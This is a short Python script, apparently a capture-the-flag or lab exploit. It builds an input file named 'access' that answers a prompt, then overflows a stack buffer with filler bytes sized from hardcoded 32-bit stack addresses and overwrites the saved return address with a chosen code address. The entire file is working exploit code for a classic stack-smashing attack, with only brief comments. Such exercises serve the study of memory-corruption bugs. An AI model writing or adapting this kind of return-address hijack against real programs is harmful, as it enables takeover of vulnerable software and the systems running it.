def addr_little_endian(addr, n_bytes):
    """`to_bytes(4, byteorder='little')` was buggy for some reason"""
    mask = 0xff
    ans = []
    for i in range(n_bytes):
        x = addr & mask
        for j in range(i):
            x = x >> 8

        ans.append(x.to_bytes(1, byteorder='big'))
        mask = mask << 8

    return ans


def main():
    # Answer `1` at the first prompt
    with open('access', 'w') as f:
        f.write("1\n")

    with open('access', 'ab') as f:
        ebp = 0xffffc168
        buf_addr = ebp - 0x70  # 0x080486fa
        eip = 0xffffc16c

        n_fill = eip - buf_addr

        # Overflow buffer and smash the stack
        for i in range(n_fill):
            f.write(b'\xff')

        # Set return address
        addr = 0x08048626
        for b in addr_little_endian(addr, 4):
            f.write(b)


main()
